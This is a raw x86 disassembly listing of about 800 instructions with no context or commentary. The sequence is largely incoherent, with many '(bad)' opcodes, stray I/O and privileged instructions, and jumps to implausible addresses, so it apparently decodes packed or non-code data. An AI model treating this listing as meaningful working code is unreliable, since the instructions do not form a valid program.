  40850f:	mov    edx,0xf726ed7c
  408514:	jl     0x4084bd
  408516:	push   0x12
  408518:	add    al,0xf4
  40851a:	lock pop ds
  40851c:	xchg   ebx,eax
  40851d:	sub    bl,BYTE PTR [esi+0x22f633ea]
  408523:	cld    
  408524:	mov    WORD PTR [ebx],ds
  408526:	add    al,0xa7
  408528:	and    al,0x5d
  40852b:	out    dx,al
  40852c:	mov    WORD PTR [eax],gs
  40852e:	add    ecx,edx
  408530:	mov    edx,0x2440c38d
  408535:	jle    0x40857c
  408537:	mov    esp,0x858a0750
  40853c:	mov    dl,BYTE PTR [edx+eax*1+0x2a]
  408540:	cli    
  408541:	das    
  408542:	mov    ch,0x1a
  408544:	cld    
  408545:	jno    0x408560
  408547:	jne    0x40854e
  408549:	mov    esi,eax
  40854b:	dec    esi
  40854c:	jmp    0x408554
  40854e:	stos   BYTE PTR es:[edi],al
  40854f:	add    eax,0x41833788
  408554:	jne    0x40853c
  408556:	fcomp  DWORD PTR [edx-0x53]
  408559:	sub    edx,DWORD PTR [ebx*2-0x5f1f3e8e]
  408560:	pop    ecx
  408561:	and    DWORD PTR [ecx+0x5d],0x68
  408565:	add    DWORD PTR [eax-0x3cf77cfa],ecx
  40856b:	sub    DWORD PTR [ebp-0x43],0x4b
  40856f:	push   ebp
  408570:	scas   al,BYTE PTR es:[edi]
  408571:	add    eax,0xeed3b3e7
  408576:	push   0x15
  408578:	fwait
  408579:	jnp    0x408547
  40857b:	or     ecx,DWORD PTR [edx-0x2d]
  40857e:	loopne 0x4085d0
  408580:	das    
  408581:	xor    ecx,edx
  408583:	mov    esp,0xf85fe201
  408588:	hlt    
  408589:	and    esi,0x4e08feff
  40858f:	or     esi,0x34328ef
  408595:	fiadd  WORD PTR [esi+0x2e]
  408598:	sub    al,0xce
  40859a:	mov    BYTE PTR [eax+edx*1],cl
  40859d:	loop   0x4085c4
  40859f:	and    BYTE PTR [esi-0x39bc5c01],dh
  4085a5:	jne    0x1fa5024
  4085ab:	mov    eax,ds:0xb4ce6c8b
  4085b0:	nop
  4085b1:	add    DWORD PTR [ecx],edi
  4085b3:	or     edi,edi
  4085b5:	call   0x533ae5a2
  4085ba:	sbb    DWORD PTR [eax-0x3a],eax
  4085bd:	xor    dh,BYTE PTR [ebx]
  4085bf:	xor    al,0x35
  4085c1:	push   es
  4085c2:	cmp    BYTE PTR [ecx],bh
  4085c4:	inc    ecx
  4085c5:	inc    edx
  4085c6:	mov    BYTE PTR [edi+0x45c91bf8],dh
  4085cc:	inc    esi
  4085cd:	inc    edi
  4085ce:	dec    eax
  4085cf:	dec    ecx
  4085d0:	dec    edx
  4085d1:	or     DWORD PTR [ebp+0x4e],ecx
  4085d4:	dec    edi
  4085d5:	(bad)  
  4085d7:	push   esi
  4085d8:	mov    ds:0x5655d0fc,eax
  4085dd:	jns    0x408638
  4085df:	jg     0x4085ca
  4085e1:	add    dl,BYTE PTR [edi+0x6f63622e]
  4085e7:	data16 and BYTE PTR [bp+si+0x6b],ch
  4085ec:	ins    BYTE PTR es:[edi],dx
  4085ed:	ins    DWORD PTR es:[edi],dx
  4085ee:	outs   dx,BYTE PTR ds:[esi]
  4085ef:	outs   dx,DWORD PTR ds:[esi]
  4085f0:	xor    eax,0x70c6f568
  4085f5:	jno    0x408670
  4085f7:	je     0x40866e
  4085f9:	jbe    0x408660
  4085fb:	xor    esp,DWORD PTR [edi-0x40]
  4085fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085ff:	sub    cl,ch
  408601:	and    ax,0xd388
  408605:	add    BYTE PTR [eax-0x6dfc6f9],0xed
  40860c:	mov    eax,0x2134f364
  408611:	xchg   DWORD PTR [ebx+eiz*4],esp
  408614:	add    dh,ch
  408616:	or     bl,cl
  408618:	ins    BYTE PTR es:[edi],dx
  408619:	cmp    eax,DWORD PTR [ebx-0x71]
  40861c:	adc    esi,eax
  40861e:	push   edx
  40861f:	add    eax,eax
  408621:	in     al,0x50
  408623:	fnstenv [esi]
  408625:	(bad)  [esi-0x70]
  408628:	sub    BYTE PTR [ebx+0xf],dl
  40862b:	clc    
  40862c:	inc    eax
  40862d:	push   esp
  40862e:	add    edx,DWORD PTR [eax]
  408630:	cs xchg edi,eax
  408632:	int    0xb2
  408634:	cmp    BYTE PTR [edi+0x8],dl
  408637:	pusha  
  408638:	scas   al,BYTE PTR es:[edi]
  408639:	loopne 0x4085e7
  40863b:	int3   
  40863c:	mov    dh,0xcb
  40863e:	in     eax,0xb6
  408640:	pop    ecx
  408641:	pushf  
  408642:	inc    eax
  408643:	fimul  WORD PTR [ebx]
  408645:	enter  0x2cdd,0xdf
  408649:	cld    
  40864a:	stos   DWORD PTR es:[edi],eax
  40864b:	fsub   QWORD PTR [ebx]
  40864d:	xor    dh,BYTE PTR [ebx-0x38818080]
  408653:	sahf   
  408654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408655:	add    eax,0x89ee04b8
  40865a:	inc    edx
  40865b:	js     0x4085fe
  40865d:	jns    0x40864e
  40865f:	scas   eax,DWORD PTR es:[edi]
  408660:	sti    
  408661:	enter  0x8849,0xef
  408665:	pop    eax
  408666:	jo     0x408622
  408668:	xchg   esp,eax
  408669:	or     DWORD PTR [eax-0x41885ffc],edi
  40866f:	add    eax,0xb81052ab
  408674:	cmp    al,al
  408676:	shr    ah,1
  408678:	push   es
  408679:	je     0x4085fe
  40867b:	mov    BYTE PTR [eax+0x52ec1ca0],bh
  408681:	cmp    eax,0x585ca7a1
  408686:	dec    esp
  408687:	pop    edx
  408688:	mov    eax,0x1bde31ac
  40868d:	jecxz  0x4086ab
  40868f:	loopne 0x408632
  408691:	and    eax,0xe0a3c50
  408696:	fnstenv [ebp+0x35b160b6]
  40869c:	sbb    al,0xdb
  40869e:	shr    BYTE PTR [edi],1
  4086a0:	ficomp WORD PTR [esi-0x23055c43]
  4086a6:	push   esp
  4086a7:	mov    eax,0xe85635bc
  4086ac:	inc    edx
  4086ad:	loopne 0x408667
  4086af:	int3   
  4086b0:	mov    edx,0x574f65e0
  4086b5:	test   BYTE PTR [edi],dh
  4086b7:	mov    ds:0xfadca73c,eax
  4086bc:	sub    ecx,DWORD PTR [ecx+edi*8]
  4086bf:	xchg   edx,eax
  4086c0:	fsub   QWORD PTR [esi+0x14]
  4086c3:	lea    ecx,[ebp-0x24]
  4086c6:	jbe    0x4086db
  4086c8:	call   0xbff963d4
  4086cd:	push   edx
  4086ce:	rol    BYTE PTR [edi-0x23],0xbc
  4086d2:	add    eax,0xd85e4f7d
  4086d7:	mov    eax,0x111453e8
  4086dc:	les    eax,FWORD PTR [esp+eiz*2-0x7f32de1c]
  4086e3:	out    dx,eax
  4086e4:	push   es
  4086e5:	push   0xa6514ee1
  4086ea:	adc    al,0x69
  4086ec:	mov    al,ds:0xb702c916
  4086f1:	dec    edi
  4086f2:	popa   
  4086f3:	rol    BYTE PTR [edx+0x49],1
  4086f6:	lahf   
  4086f7:	sub    ecx,DWORD PTR [ebp-0x1]
  4086fa:	mov    ch,0x24
  4086fc:	mov    edx,0x629c7ad0
  408701:	jne    0x408712
  408703:	xchg   ebp,eax
  408704:	pop    edi
  408705:	adc    bh,BYTE PTR [ebp+0x5161733e]
  40870b:	inc    ebx
  40870c:	pop    eax
  40870d:	jns    0x408779
  40870f:	je     0x40876b
  408711:	sub    cl,bl
  408713:	xchg   ebx,eax
  408714:	cmp    esi,DWORD PTR [ebx+0x4b]
  408717:	or     esi,DWORD PTR gs:[ebp+0x42]
  40871b:	add    bh,bl
  40871d:	and    BYTE PTR [ecx],ch
  40871f:	xchg   edi,eax
  408720:	add    cl,BYTE PTR [ebp+0x6c9d1b40]
  408726:	jbe    0x4087a6
  408728:	xor    dl,BYTE PTR [ebx]
  40872a:	mov    eax,eax
  40872c:	add    BYTE PTR [ebx],al
  40872e:	pop    ss
  40872f:	pop    eax
  408730:	and    bh,bh
  408732:	jg     0x4087a7
  408734:	mov    ecx,0xe0240413
  408739:	daa    
  40873a:	retf   
  40873b:	int3   
  40873c:	enter  0xd7c9,0xcf
  408740:	enter  0xcecd,0xdb
  408744:	fcomp  st(2)
  408746:	fxch   st(2)
  408748:	fdiv   QWORD PTR [ecx-0x22039238]
  40874e:	(bad)  
  408750:	loopne 0x408733
  408752:	jecxz  0x40879a
  408754:	in     eax,0x2f
  408756:	push   edi
  408757:	out    dx,eax
  408758:	jnp    0x4086db
  40875a:	outs   dx,DWORD PTR ds:[esi]
  40875b:	inc    ebx
  40875c:	push   edx
  40875d:	jne    0x4087cd
  40875f:	je     0x40878e
  408761:	and    BYTE PTR gs:[ebp+0xf],ah
  408765:	and    BYTE PTR [eax],al
  408767:	inc    edi
  408768:	xchg   edx,eax
  408769:	or     esi,edx
  40876b:	popa   
  40876c:	je     0x40878e
  40876e:	xor    BYTE PTR [edi],bl
  408770:	or     eax,DWORD PTR [eax]
  408772:	mov    dh,0x77
  408774:	inc    ebx
  408775:	add    BYTE PTR fs:[edx],dh
  408778:	dec    ebx
  408779:	pop    ds
  40877a:	add    BYTE PTR [eax+eax*1],bl
  40877d:	add    ebx,DWORD PTR [esi]
  40877f:	adc    bl,al
  408781:	test   BYTE PTR [ebp+0x9],cl
  408784:	sbb    eax,0x3d9e3917
  408789:	retf   0x3000
  40878c:	popa   
  40878d:	not    DWORD PTR [eax+0x4052ef66]
  408793:	data16 fld DWORD PTR [ebx]
  408796:	adc    BYTE PTR [ebp+0x18],dl
  408799:	add    BYTE PTR [ecx+ebx*1+0x4e],dl
  40879d:	dec    edx
  40879e:	inc    ebx
  40879f:	aas    
  4087a0:	sub    ecx,DWORD PTR [ebp-0x29]
  4087a3:	std    
  4087a4:	ja     0x408751
  4087a6:	add    BYTE PTR [esi+eiz*1+0x5],bl
  4087aa:	and    eax,0xd8642a2e
  4087af:	and    esp,eax
  4087b1:	add    ebp,eax
  4087b3:	lock xor al,0xcd
  4087b6:	div    BYTE PTR [ebx+esi*1-0x8]
  4087ba:	push   esi
  4087bb:	add    ecx,DWORD PTR [eax]
  4087bd:	adc    BYTE PTR [eax],bl
  4087bf:	shl    DWORD PTR [ecx*2+0x302820d3],cl
  4087c6:	cmp    BYTE PTR [eax+0x4d],al
  4087c9:	shl    DWORD PTR [ecx*2+0x60585048],cl
  4087d0:	push   0xd34d3470
  4087d5:	xor    al,0x78
  4087d7:	or     BYTE PTR [eax+0x34d39890],0x4d
  4087de:	shl    DWORD PTR [eax-0x3f474f58],cl
  4087e4:	dec    ebp
  4087e5:	shl    DWORD PTR [ecx*2-0x1f272f38],cl
  4087ec:	call   0xd51695e1
  4087f1:	xor    al,0xf8
  4087f3:	add    BYTE PTR [edi+0x3003d702],bh
  4087f9:	enter  0x8320,0x7
  4087fd:	add    al,0x5
  4087ff:	fs and eax,0x43516727
  408805:	gs push 0x72
  408808:	nop
  408809:	inc    ecx
  40880a:	mov    esi,0x78c46c07
  40880f:	pop    ebx
  408810:	inc    ecx
  408811:	dec    esi
  408812:	push   cs
  408813:	jb     0x4087e5
  408815:	sub    BYTE PTR [eax+eax*4+0x3c],bl
  408819:	cmp    eax,ecx
  40881b:	leave  
  40881c:	xor    al,0x5d
  40881e:	in     al,dx
  40881f:	dec    esp
  408820:	pop    esi
  408821:	add    BYTE PTR [edi+0x17],bl
  408824:	and    DWORD PTR [edi-0x62],ecx
  408827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408828:	pop    esi
  408829:	pop    eax
  40882a:	pop    edi
  40882b:	mov    ah,0x72
  40882d:	repnz in al,0x20
  408830:	pop    esp
  408831:	pop    ecx
  408832:	jo     0x408894
  408834:	int3   
  408835:	iret   
  408836:	add    BYTE PTR [ebp+0x591ec10f],bl
  40883c:	and    dh,al
  40883e:	ja     0x4087ca
  408840:	xchg   ebx,eax
  408841:	and    cl,al
  408843:	add    DWORD PTR [ebp-0x6596a355],ecx
  408849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40884a:	(bad)  [ebp+0x6c]
  40884d:	add    edi,DWORD PTR [eax+edx*4-0x60]
  408851:	mov    al,0xb2
  408853:	imul   ebx,DWORD PTR [edx-0x1b2b3f5a],0x4dd808f4
  40885d:	shl    DWORD PTR [ecx*8+0x48382818],cl
  408864:	pop    eax
  408865:	xor    ecx,DWORD PTR fs:[ebp-0x2d]
  408869:	xor    al,0x78
  40886b:	mov    BYTE PTR [eax+0x2c4664ac],bl
  408871:	(bad)  
  408872:	pop    esi
  408873:	add    DWORD PTR [edx],eax
  408875:	add    ecx,DWORD PTR [edx]
  408877:	adc    eax,DWORD PTR [edi+eiz*4-0x20ab1ec5]
  40887e:	jmp    DWORD PTR [eax]
  408880:	add    ebp,DWORD PTR [eax+0x54]
  408883:	out    0x11,eax
  408885:	adc    al,0xa4
  408887:	jecxz  0x408809
  408889:	or     ebp,eax
  40888b:	loopne 0x4088db
  40888d:	fdiv   DWORD PTR [ebp-0x80]
  408890:	mov    al,ds:0xa7f0101b
  408895:	or     BYTE PTR [edi],cl
  408897:	add    BYTE PTR [eax+0x33c3e3ee],bl
  40889d:	cwde   
  40889e:	add    edi,DWORD PTR [eax-0x39]
  4088a1:	test   BYTE PTR [ebx],dl
  4088a3:	jbe    0x4088fb
  4088a5:	adc    BYTE PTR [edi+edx*8-0x48],0xdb
  4088aa:	jmp    0x36ac3a4b
  4088af:	adc    edx,DWORD PTR [eax+0x8]
  4088b2:	pop    ds
  4088b3:	dec    eax
  4088b4:	push   esp
  4088b5:	push   ebx
  4088b6:	mov    BYTE PTR ds:0xaf0ee9a7,bl
  4088bc:	outs   dx,DWORD PTR ds:[esi]
  4088bd:	enter  0x3780,0x14
  4088c1:	xlat   BYTE PTR ds:[ebx]
  4088c2:	je     0x4088a1
  4088c4:	enter  0x4102,0xc
  4088c8:	das    
  4088c9:	dec    eax
  4088ca:	pop    es
  4088cb:	add    al,0x10
  4088cd:	add    ebx,DWORD PTR [ebp-0x6fa1144f]
  4088d3:	sub    DWORD PTR [edi],0xffffffe0
  4088d6:	add    esi,eax
  4088d8:	push   esp
  4088d9:	cmp    ebx,DWORD PTR [eax-0x39]
  4088dc:	jmp    0x408898
  4088de:	xlat   BYTE PTR ds:[ebx]
  4088df:	pop    es
  4088e0:	mov    al,ds:0x3383b4b
  4088e5:	pusha  
  4088e6:	pop    es
  4088e7:	arpl   si,bp
  4088e9:	popf   
  4088ea:	icebp  
  4088eb:	mov    ebp,0x9f551f0b
  4088f0:	jo     0x40892d
  4088f2:	xchg   ebx,eax
  4088f3:	push   es
  4088f4:	arpl   WORD PTR [eax],si
  4088f6:	mov    edx,0xeb50b30c
  4088fb:	and    BYTE PTR [ebx-0x4e61cc88],cl
  408901:	jmp    0x408942
  408903:	mov    eax,0xc7559003
  408908:	enter  0x9b54,0xec
  40890c:	mov    edx,0xb70c0a33
  408911:	and    BYTE PTR [ebx-0x48],bh
  408914:	fwait
  408915:	jo     0x40896c
  408917:	scas   eax,DWORD PTR es:[edi]
  408918:	jmp    0x4088b4
  40891a:	into   
  40891b:	aas    
  40891c:	xor    al,bl
  40891e:	sbb    ebx,DWORD PTR [ebx+ecx*1]
  408921:	lock pop ebx
  408923:	loope  0x40892b
  408925:	jecxz  0x40899c
  408927:	or     ebp,DWORD PTR [eax+0x2f44e3f7]
  40892d:	xlat   BYTE PTR ds:[ebx]
  40892e:	je     0x40898d
  408930:	mul    edi
  408932:	inc    eax
  408933:	adc    ebp,esp
  408935:	jae    0x408907
  408937:	pop    es
  408938:	cwde   
  408939:	or     BYTE PTR [ebx+0x75],dl
  40893c:	outs   dx,DWORD PTR ds:[esi]
  40893d:	xor    BYTE PTR [edx-0x1724d7f5],bh
  408943:	mov    ds:0x49eef83b,eax
  408948:	int    0xee
  40894a:	or     DWORD PTR [bx+si+0x5455],0x5f
  408950:	and    al,0xf1
  408952:	push   ebx
  408953:	gs addr16 sahf 
  408956:	push   cs
  408957:	aas    
  408958:	mov    edi,0x54d007f0
  40895d:	pusha  
  40895e:	inc    ecx
  40895f:	push   0xffffff9a
  408961:	dec    eax
  408962:	mov    al,0x28
  408964:	lahf   
  408965:	add    BYTE PTR [eax],al
  408967:	nop
  408968:	push   ecx
  408969:	adc    al,0x15
  40896b:	popa   
  40896c:	test   eax,0x99400388
  408971:	pop    ds
  408972:	add    al,0x20
  408974:	inc    ecx
  408975:	add    BYTE PTR [eax],cl
  408977:	adc    BYTE PTR [eax],ah
  408979:	ror    BYTE PTR ds:0x41301085,1
  40897f:	fldenv [edx]
  408981:	test   BYTE PTR [eax+0x50],cl
  408984:	xor    eax,0xa2216115
  408989:	or     esi,DWORD PTR [ebx]
  40898b:	(bad)  
  40898c:	aas    
  40898d:	adc    BYTE PTR [ecx],al
  40898f:	add    BYTE PTR [ecx+0x0],al
  408992:	push   es
  408993:	add    BYTE PTR [eax+eax*1+0x56],al
  408997:	add    BYTE PTR [ebx+0x0],al
  40899a:	dec    esp
  40899b:	add    edi,edi
  40899d:	aaa    
  40899e:	fwait
  40899f:	jnp    0x4089ac
  4089a1:	add    BYTE PTR [eax+0x7],dl
  4089a4:	or     eax,0x4500474b
  4089a9:	add    BYTE PTR [ecx+0x0],cl
  4089ac:	dec    esi
  4089ad:	add    BYTE PTR [esi+0x0],al
  4089b0:	dec    edi
  4089b1:	mov    bh,0xbf
  4089b3:	jge    0x408a08
  4089b5:	adc    edx,edi
  4089b7:	pop    DWORD PTR [eax]
  4089b9:	push   0xffffff89
  4089bb:	or     eax,0xef74009c
  4089c0:	add    BYTE PTR [ebp+0x1a],ch
  4089c3:	ror    BYTE PTR [edi-0x1b],0xff
  4089c7:	(bad)  
  4089c8:	inc    DWORD PTR [eax]
  4089ca:	(bad)  
  4089cb:	xchg   edi,eax
  4089cc:	add    BYTE PTR [ebx+0x24a20010],bl
  4089d2:	add    BYTE PTR [esi+0x20ea00a3],ah
  4089d8:	add    BYTE PTR ds:0xbfbe0070,ah
  4089de:	add    BYTE PTR [esi-0x4845ff4d],dh
  4089e4:	std    
  4089e5:	jg     0x4089a2
  4089e7:	mov    ch,0x58
  4089e9:	inc    ecx
  4089ea:	pop    esp
  4089eb:	cmp    cl,BYTE PTR [esi+0x31001c39]
  4089f1:	scas   eax,DWORD PTR es:[edi]
  4089f2:	add    BYTE PTR ds:0xdd100013,ch
  4089f8:	add    BYTE PTR [ebx-0x40000242],cl
  4089fe:	and    DWORD PTR es:[edi+0xa2b200],ebx
  408a05:	arpl   WORD PTR [edx],di
  408a07:	add    BYTE PTR ds:0x31110093,dl
  408a0d:	add    cl,al
  408a0f:	mov    ah,0x0
  408a11:	jg     0x408a45
  408a13:	jno    0x408a4e
  408a15:	add    BYTE PTR [edx],al
  408a17:	jg     0x4089f0
  408a19:	(bad)  
  408a1a:	fbstp  TBYTE PTR [edi+0x42]
  408a1d:	mov    eax,0xcd0500
  408a22:	test   BYTE PTR [edi],0x0
  408a25:	pop    esi
  408a26:	call   0xa7c581
  408a2b:	in     eax,0x63
  408a2d:	add    BYTE PTR [ebp+0x15dfe8f0],dl
  408a33:	add    eax,0x98b3a2
  408a38:	aad    0x53
  408a3a:	add    cl,dl
  408a3c:	cmp    ebx,ebx
  408a3e:	mov    bh,0x5f
  408a40:	test   al,0xdd
  408a42:	add    BYTE PTR ds:0x9e16003d,dh
  408a48:	sar    DWORD PTR [edi],0x0
  408a4b:	leave  
  408a4c:	cmp    ebx,DWORD PTR [esi-0x1]
  408a4f:	fcomi  st,st(6)
  408a51:	in     eax,dx
  408a52:	xchg   BYTE PTR [eax],al
  408a54:	iret   
  408a55:	dec    edx
  408a56:	cmp    al,0xa9
  408a58:	add    BYTE PTR [edi+ebx*2],dl
  408a5b:	shr    DWORD PTR [ecx],cl
  408a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a5e:	and    eax,DWORD PTR [eax]
  408a60:	mov    eax,ds:0xe46200e0
  408a65:	add    BYTE PTR [eax],dl
  408a67:	jmp    FWORD PTR [edi-0x49]
  408a6a:	data16 cmp BYTE PTR [edx],ah
  408a6d:	int3   
  408a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a6f:	mov    ebp,0x7f8e00
  408a74:	jecxz  0x408a46
  408a76:	add    BYTE PTR [ebp-0x249fffd],al
  408a7c:	fild   DWORD PTR [esi]
  408a7e:	jns    0x408ae0
  408a80:	call   0x1414d0a
  408a85:	pop    ebp
  408a86:	add    BYTE PTR [edx-0x129d38d4],al
  408a8c:	push   esi
  408a8e:	call   FWORD PTR [edx+eax*1]
  408a91:	add    BYTE PTR [eax-0x2031ff7f],ah
  408a97:	add    BYTE PTR [ebp-0x25],bl
  408a9a:	cmp    ebp,DWORD PTR [eax+eax*1+0x20]
  408a9e:	jbe    0x408aa0
  408aa0:	lods   eax,DWORD PTR ds:[esi]
  408aa1:	or     al,BYTE PTR [eax]
  408aa3:	das    
  408aa4:	gs lock ja 0x408a83
  408aa8:	mov    esi,0xf4f5c7b5
  408aad:	xchg   edx,ecx
  408aaf:	add    BYTE PTR [eax-0x674c039b],dl
  408ab5:	mov    bl,0xbf
  408ab7:	in     eax,dx
  408ab8:	(bad)  
  408ab9:	mov    dh,0xed
  408abb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408abc:	jp     0x408ae4
  408abe:	or     ah,dl
  408ac0:	pop    edi
  408ac1:	ret    0x69fe
  408ac4:	jmp    0xee3c8efe
  408ac9:	mov    edi,0xb9edbf97
  408ace:	add    cl,dh
  408ad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ad1:	es repz add al,dh
  408ad5:	sbb    al,BYTE PTR [eax]
  408ad7:	jge    0x408a89
  408ad9:	std    
  408ada:	add    eax,0x94286947
  408adf:	add    BYTE PTR [ecx],cl
  408ae1:	leave  
  408ae2:	add    dl,dh
  408ae4:	jecxz  0x408a8b
  408ae6:	idiv   bh
  408ae8:	(bad)  [esi+0x1832d738]
  408aee:	or     ah,bl
  408af0:	sub    eax,DWORD PTR [eax]
  408af2:	adc    ah,BYTE PTR [edi+0x545300]
  408af8:	mov    ds:0x2fc5005b,eax
  408afd:	fstp   TBYTE PTR [esi-0xd32244b]
  408b03:	push   ds
  408b04:	inc    edi
  408b05:	or     BYTE PTR [ecx+0x70],bl
  408b08:	mov    ch,0x0
  408b0a:	rol    BYTE PTR [eax+0x7dbbaac3],1
  408b10:	mov    edi,0x33b47d
  408b15:	mov    cl,0x53
  408b17:	xchg   esp,eax
  408b18:	push   ecx
  408b19:	add    BYTE PTR [ebx+0x26],bh
  408b1c:	mov    edi,0xcae70531
  408b21:	je     0x408b7e
  408b23:	mov    ebx,0x177f95
  408b28:	xchg   ebp,eax
  408b29:	lea    eax,[eax]
  408b2b:	test   al,0x75
  408b2d:	xchg   edx,eax
  408b2e:	mov    DWORD PTR [edi],eax
  408b30:	xor    ah,bl
  408b32:	sti    
  408b33:	fild   QWORD PTR [esi]
  408b35:	sub    al,0xfc
  408b37:	xor    BYTE PTR [eax],al
  408b39:	jl     0x408b36
  408b3b:	add    BYTE PTR [ecx-0x57],bh
  408b3e:	dec    esp
  408b3f:	cmp    BYTE PTR [edi+0xebdaee],0xff
  408b46:	faddp  st(2),st
  408b48:	mov    edi,0x1f00ed75
  408b4d:	cs aam 0xbf
  408b50:	inc    esi
  408b51:	add    eax,0xd29900ad
  408b56:	add    BYTE PTR [ecx-0x31],dl
  408b59:	xchg   esp,eax
  408b5a:	pop    eax
  408b5b:	fsub   DWORD PTR [eax-0x30f31e80]
  408b61:	ret    
  408b62:	jg     0x408b8f
  408b64:	fcomp  QWORD PTR [esi-0x44]
  408b67:	and    DWORD PTR [eax],eax
  408b69:	add    al,0xf2
  408b6b:	repz mov dh,0x2e
  408b6e:	mov    edi,0x570096bc
  408b73:	bound  eax,QWORD PTR [eax]
  408b75:	outs   dx,DWORD PTR ds:[esi]
  408b76:	das    
  408b77:	ins    BYTE PTR es:[edi],dx
  408b78:	mov    bh,0x28
  408b7a:	xchg   BYTE PTR ds:0x49e59225,ah
  408b80:	call   0xaa:0xabbf1900
  408b87:	dec    DWORD PTR [ebx]
  408b89:	fild   DWORD PTR [ebp-0x74f3b395]
  408b8f:	mov    al,0x78
  408b91:	push   ebp
  408b92:	stc    
  408b93:	add    dl,dl
  408b95:	jle    0x408b97
  408b97:	std    
  408b98:	jnp    0x408b9a
  408b9a:	push   esi
  408b9b:	mov    al,0x6d
  408b9d:	fcomi  st,st(2)
  408b9f:	add    eax,DWORD PTR [eax]
  408ba1:	dec    edi
  408ba2:	jo     0x408c13
  408ba4:	mov    eax,ds:0xbc00b31d
  408ba9:	sbb    ebp,ebx
  408bab:	sub    ah,BYTE PTR [eax+0x5ec4bd]
  408bb1:	fnstsw WORD PTR [ecx+0x3dfaaf11]
  408bb7:	pop    ss
  408bb8:	fidiv  DWORD PTR [esi-0x2e40b050]
  408bbe:	in     al,dx
  408bbf:	jg     0x408c2e
  408bc1:	inc    edx
  408bc2:	ss int 0xc8
  408bc5:	xor    edx,edx
  408bc7:	mov    edi,0x270f8390
  408bcc:	mov    esi,0x233c8cd2
  408bd1:	lahf   
  408bd2:	sub    DWORD PTR [esi],ecx
  408bd4:	pop    esp
  408bd5:	and    ecx,ebp
  408bd7:	enter  0x6d33,0xd3
  408bdb:	sti    
  408bdc:	inc    edx
  408bdd:	jo     0x408c12
  408bdf:	ror    BYTE PTR [esp+edi*1+0x2d58dbf5],cl
  408be6:	retf   
  408be7:	and    ecx,ebp
  408be9:	enter  0xaba7,0x36
  408bed:	pop    esp
  408bee:	add    BYTE PTR [ebx-0x49],dl
  408bf1:	mov    eax,0xba23b635
  408bf6:	out    0x17,eax
  408bf8:	mov    WORD PTR [ebx-0x41],?
  408bfb:	and    ecx,esi
  408bfd:	fidiv  DWORD PTR [esi+0x6b]
  408c00:	fild   WORD PTR [eax]
  408c02:	mov    edx,0xc50bbb00
  408c07:	dec    ebp
  408c08:	inc    ebx
  408c09:	add    al,0x62
  408c0b:	dec    edx
  408c0c:	mov    bl,0xb7
  408c0e:	(bad)  
  408c0f:	mov    edi,0x5277bcdd
  408c14:	sub    DWORD PTR [esi],edx
  408c16:	add    BYTE PTR [eax+0x5a],ch
  408c19:	add    BYTE PTR [ebx+0x2f],bl
  408c1c:	data16 sti 
  408c1e:	arpl   WORD PTR [eax],di
  408c20:	jo     0x408c85
  408c22:	mov    eax,ds:0xef6af86d
  408c27:	adc    esi,DWORD PTR [edx]
  408c29:	imul   esi,DWORD PTR [ebx-0x647a92d6],0xb93f25a3
  408c33:	mov    ebp,0xd708f412
  408c38:	ins    DWORD PTR es:[edi],dx
  408c39:	jnp    0x408c1c
  408c3b:	mov    dh,0x29
  408c3d:	mov    ah,0x23
  408c3f:	lods   eax,DWORD PTR ds:[esi]
  408c40:	mov    dl,0x16
  408c42:	sbb    eax,DWORD PTR [eax]
  408c44:	pop    eax
  408c45:	inc    edi
  408c46:	fld    QWORD PTR ds:0xb636db70
  408c4c:	pop    ecx
  408c4d:	outs   dx,BYTE PTR ds:[esi]
  408c4e:	imul   esi,DWORD PTR [edi+0xb55b6e9],0x4b6d797b
  408c58:	mov    gs,WORD PTR [ebp+0x3f803843]
  408c5e:	adc    eax,0x91e0a17d
  408c63:	xchg   bh,al
  408c65:	mov    eax,0xff9217ec
  408c6a:	popa   
  408c6b:	add    BYTE PTR [eax+0x7f],bh
  408c6e:	push   eax
  408c6f:	sbb    DWORD PTR [ecx+0x46],ebp
  408c72:	sahf   
  408c73:	dec    ebp
  408c74:	out    0xd1,eax
  408c76:	jbe    0x408ca3
  408c78:	sahf   
  408c79:	xchg   ecx,eax
  408c7a:	data16 in al,0x89
  408c7d:	lea    ebx,[ebx+ebx*1]
  408c80:	stos   DWORD PTR es:[edi],eax
  408c81:	pop    ecx
  408c82:	push   ds
  408c83:	imul   eax,DWORD PTR [esi-0x71],0x3c001720
  408c8a:	scas   eax,DWORD PTR es:[edi]
  408c8b:	mov    dh,0x8d
  408c8d:	in     eax,0x1f
  408c8f:	jae    0x408cdf
  408c91:	add    BYTE PTR [edi-0x120fff3a],cl
  408c97:	(bad)  
  408c98:	rol    ch,1
  408c9a:	push   ecx
  408c9b:	jae    0x408d19
  408c9d:	fcmovnu st,st(0)
  408c9f:	mov    ecx,0x57672e1
  408ca4:	mov    ds:0xffd400f8,eax
  408ca9:	imul   ebx,ebx,0xffffffc6
  408cac:	jae    0x408d11
  408cae:	hlt    
  408caf:	aas    
  408cb0:	addr16 inc esi
  408cb2:	dec    ebx
  408cb3:	int3   
  408cb4:	mov    DWORD PTR [eax+edi*4+0x5b],0x37f505a1
  408cbc:	add    BYTE PTR [ebp-0x2b551348],dh
  408cc2:	test   eax,0xe36db637
  408cc7:	daa    
  408cc8:	add    BYTE PTR [edi+eax*4],dh
  408ccb:	fld    TBYTE PTR [esi-0x64]
  408cce:	gs cdq 
  408cd0:	push   ecx
  408cd1:	lods   al,BYTE PTR ds:[esi]
  408cd2:	imul   esi,DWORD PTR [esi-0x5f],0xe414b6d
  408cd9:	jp     0x408ce6
  408cdb:	ds test edi,edi
  408cde:	mov    ah,0xc2
  408ce0:	pop    eax
  408ce1:	fdiv   DWORD PTR [esi]
  408ce3:	(bad)  
  408ce5:	mov    edi,0x76aa0d84
  408cea:	inc    ebx
  408ceb:	jno    0x408d50
  408ced:	xchg   esp,eax
  408cee:	jle    0x408ccb
  408cf0:	loope  0x408d0d
  408cf2:	lods   eax,DWORD PTR ds:[esi]
  408cf3:	imul   ecx,esi,0xb991300
  408cf9:	call   FWORD PTR [ecx+0x1b]
  408cfc:	sbb    ecx,DWORD PTR [ebp-0xbb9017b]
  408d02:	cld    
  408d03:	leave  
